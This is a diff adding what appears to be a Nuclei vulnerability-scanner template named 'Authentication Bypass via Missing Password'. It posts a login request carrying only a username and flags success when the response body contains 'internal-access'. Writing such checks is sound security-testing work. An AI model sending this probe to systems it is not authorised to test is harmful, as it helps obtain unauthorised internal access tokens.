@@ -1,0 +1,31 @@
+id: ch1-auth-bypass-internal-token
+
+info:
+  name: Authentication Bypass via Missing Password
+  author: sai-mallela
+  severity: high
+  description: Login endpoint issues internal access token when password is missing
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "username": "testuser"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "internal-access"
